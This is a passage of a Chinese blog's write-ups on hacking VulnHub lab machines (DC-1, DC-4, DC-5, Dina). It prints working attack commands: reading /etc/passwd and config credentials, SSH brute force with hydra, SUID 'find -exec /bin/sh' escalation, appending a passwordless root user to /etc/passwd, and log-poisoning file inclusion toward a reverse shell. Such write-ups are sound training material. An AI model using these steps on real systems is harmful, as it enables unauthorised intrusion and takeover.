<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"></p>
<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h2><p>接下来看一下目录 发现有flag1.txt<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">每一个好的CMS都需要一个配置文件，你也一样。</span><br></pre></td></tr></table></figure>
<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h2><p>根据flag1.txt的提示 跑去某度找了一下Drupal的目录结构<br>Drupal默认配置文件在 <code>/var/www/sites/default/settings.php</code><br>打开看一下 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* flag2</span><br><span class="line">* Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line">* only ways to gain access (and you WILL need access).</span><br><span class="line">* What can you do with these credentials?</span><br><span class="line">暴力破解和字典攻击不是获得权限的唯一方法（你可能将要进入的）</span><br><span class="line">你可以用这些认证做什么呢？</span><br></pre></td></tr></table></figure>

<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag 3"></a>flag 3</h2><p>获得flag2的同时，也获得了数据库账号和密码<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>做到这里突然想到 其实一开始可以传个大马上去的<br>后来又想了想，也可以不传<br>先做着试试吧<br>用python反弹一个交互式shell  登录MySQL数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">mysql -udbuser -p   #password:R0ck3t</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>进入数据库肯定要先查询用户了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables; </span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>密码被数据库加密了<br>这个时候修改用户admin的密码即可<br>因为数据库的密码都是加密状态的<br>所以我们用同样的加密方法生成新密码的hash值并且更新到数据库、</p>
<blockquote>
<p>参考：<a href="http://drupalchina.cn/node/2128">http://drupalchina.cn/node/2128</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh night  #生成新密码night</span><br><span class="line"></span><br><span class="line">password: night      hash: $S$DG7uGw5ymTluwrt4CxxTyYuNBD/.If3LxpxJC4Fge4cGPzpuubsQ</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>得到新密码的hash值 然后进入mysql数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -p   #password：R0ck3t</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update drupaldb.users set pass=&quot;$S$DG7uGw5ymTluwrt4CxxTyYuNBD/.If3LxpxJC4Fge4cGPzpuubsQ&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>然后我们打开浏览器 在网页Log in<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>登录成功<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>点击左上角<code>Find content</code>找到flag3<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure>

<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag 4"></a>flag 4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd   </span><br></pre></td></tr></table></figure>
<p>说起来这个命令我可太熟悉了 linux作业帮别人写了不知道多少遍 当时还不懂事还纳闷有啥用^_^<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>然后进入目录查看flag4<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>

<h2 id="flag-5"><a href="#flag-5" class="headerlink" title="flag 5"></a>flag 5</h2><p>涉及到SUID提权 了解了一下 发现需要找到可以提权可行性文件<br>尝试find</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">touch night </span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name night -exec &quot;/bin/sh&quot; \;</span><br><span class="line">whoami</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<p>逆风的方向,更适合飞翔, 我不怕千万人阻挡 ,只怕自己投降</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机DC-4的渗透记录</title>
    <url>/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>之前忙比赛，忙期末，没怎么好好学习。这几天全都补回来。</p>
<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
</blockquote>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021<br>靶机DC-4×1  网络连接模式：NAT模式<br>还有，学习时必不可少搜索引擎qwq</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先打开靶机DC-4<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩了 扫描内网，然后看一眼mac地址确定目标ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
<span id="more"></span>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定好ip之后，上namp扫描主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.136</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
<h2 id="Burp-Suite爆破登录"><a href="#Burp-Suite爆破登录" class="headerlink" title="Burp Suite爆破登录"></a>Burp Suite爆破登录</h2><p>发现ssh和web开着，先去网页那里看一下<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>很简单的一个登录界面<br>这里尝试用Burp Suite进行爆破 先开代理抓包<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>可以发现里面的password密码没有加过密，也没有验证码，那就开始爆破！<br>发送到intruder 在password那里添加爆破点 模式设置为spider（狙击手）<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>position里选择Runtime file（运行时文件） 然后start attack<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>发现有一个和别的长度都不一样 于是用happy登录<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>成功了！</p>
<h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>打开点了点，没发现什么有趣的东西。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>抓包看看有什么东西吧<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>提交的信息是ls -l，感觉会是一处命令执行<br>查看一下配置信息，发现有3个账户，一会应该有用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>讲道理，这里发现命令执行之后应该打反弹shell，但是我这不知道为啥一直不成，没办法只能另想办法了<br>又慢慢看了一些目录，发现有一个地方藏着一份密码字典。别问我怎么知道的，因为别的两个用户都没那个文件夹。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"></p>
<h2 id="利用hydra进行ssh密码爆破"><a href="#利用hydra进行ssh密码爆破" class="headerlink" title="利用hydra进行ssh密码爆破"></a>利用hydra进行ssh密码爆破</h2><p>那接下来思路就很明了了，爆破ssh密码即可<br>这里就要上kali内置的爆破神器hydra了 因为密码字典是在jim那里发现的，爆破用户Jim即可</p>
<blockquote>
<p>hydra的使用 <a href="https://www.cnblogs.com/cowherd/p/13297837.html">https://www.cnblogs.com/cowherd/p/13297837.html</a><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L dc4user.txt -P dc4.txt 192.168.55.136 -t 20 ssh </span><br></pre></td></tr></table></figure>
<p>爆破成功，得到密码，shh进行连接。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.55.136     #password:jibril04</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>简单看一下，发现有个mail 打开发现是一个测试邮件<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>这应该是一个小hint，一般邮件的目录在/var/mail，于是去进入该目录<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>好家伙 密码就这么给了 那直接去登charles咯</p>
<h2 id="切换到用户charles进行渗透"><a href="#切换到用户charles进行渗透" class="headerlink" title="切换到用户charles进行渗透"></a>切换到用户charles进行渗透</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh charles@192.168.55.136     #password:^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>同样的流程也在这里走一遍，看看会不会有新的发现。想查看邮件的时候发现我们没有权限<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"><br>应该是需要提权了</p>
<h2 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h2><p>先查看拥有哪些权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">![](26.png)</span><br></pre></td></tr></table></figure>
<p>发现可以免密码执行<br>提供了teehee命令，查看一下使用手册之后尝试一下写入文件内容进行提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo teehee -a /etc/passwd</span><br><span class="line">a::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
<p>写入一个有root权限的用户 并切换成用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su a</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>ls查看目录后发现有个flag文件<br>打开，获得flag，渗透结束。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"></p>
<hr>
<p>这次渗透也学到了很多东西。<br>任意命令执行的掌握又加了一些<br>了解了一些/var存放的一些配置文件<br>用teehee提权写入一个root用户<br>熟练的点开搜索引擎（）<br>反正收获蛮多的~</p>
<hr>
<blockquote>
<p>追逐影子的人，自己就是影子</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机DC-5的渗透记录</title>
    <url>/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>【未完成，以我现在的水平后半部分解决不了，随缘填坑更新】<br>重保期间，在学校当义工。除了盯着屏幕发呆，也没别的事。于是尝试通过靶机渗透学点东西。<br>顺便发现了靶机作者的个人主页。等DC系列结束之后就去尝试一下新系列（挖坑ing）</p>
<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p>
</blockquote>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021<br>靶机DC-5×1  网络连接模式：NAT模式<br>老生常谈——所有引擎</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
<span id="more"></span>
<p>扫描内网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>通过mac地址确定靶机后上nmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.139</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>80端口开着，去访问一下</p>
<h2 id="利用文件包含漏洞打nc反弹shell"><a href="#利用文件包含漏洞打nc反弹shell" class="headerlink" title="利用文件包含漏洞打nc反弹shell"></a>利用文件包含漏洞打nc反弹shell</h2><p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>在Contact下面发现了提交表格，那么我们的注意力就要放在这里了<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>随便提交了几回发现了一些问题 提交的内容会直接呈现在url里<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>不仅如此 这时间也有些问题<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>查看源码，发现了footer.php 于是去访问了一下<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>看样子应该是一处漏洞呀在thankuyou.php上也出现了这个问题<br>大概率是存在文件包含漏洞了<br>【这里其实一开始没注意到，后来发现了作者的个人主页，上面给了点小hint】</p>
<blockquote>
<p>作者five86的个人主页&gt; <a href="https://www.five86.com/dc-5.html">https://www.five86.com/dc-5.html</a></p>
</blockquote>
<p>访问url/thankyou.php?file=/etc/passwd<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>果然存在！ 至于我怎么知道的嘛……感觉+试出来的 这里其实可以考虑用Burp Suite或者Wfuzz遍历枚举一下<br>但是考虑只是个靶机 就试着摸了几下 一个靶机而已干嘛这么麻烦（）<br>根据之前的经验，我们已经知道这是Nginx服务器。在网站上的每一步操作都将会被写入日志文件log内，因此我们可以在这里尝试拿 shell<br>插一嘴，还可以使用Wappalyzer插件进行信息收集<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>先写进去个phpinfo()看一下<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>看来是可以的，那就直接写入一句话<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>开始打反弹shell 开启端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>转换为交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>这个命令可以查找需要root权限才可运行的文件<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>用searchsploit命令搜索screen-4.5.0<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>【利用不成功，我不会了。网上看了看别人写的发现还需要编译。对于我这个菜鸟来说实属超纲，先放一放吧，以后水平提升在转过头来解决掉。】</p>
<hr>
<blockquote>
<p>鲤鱼不跃，岂可成龙？大鹏驻足，焉能腾空？人生能有几回搏，此时不搏何时搏？</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机Dina: 1.0.1渗透记录</title>
    <url>/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/dina-101,200/">https://www.vulnhub.com/entry/dina-101,200/</a></p>
</blockquote>
<hr>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Dina: 1.0.1×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开靶机<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>看一下mac地址<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>扫描内网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用namp扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.142</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
<span id="more"></span>
<p>老规矩，先去看一下网页<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>没啥东西，扫描一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>扫到了一些目录，挨个访问看一下<br>/secure看到一个压缩包，先下载下来看看<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>/nothing 的网页源码看到了隐藏的信息，应该是一份小的密码字典<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>之前那个压缩包需要密码 密码就在字典里面，解开后是一个mp3，然而打不开。打开010 editor可以发现是个文档，并且记录了后台登录的地址和用户名<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>转到后台登录的界面，是一个CMS<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>密码字典的diana是密码，进去之后开始渗透测试<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
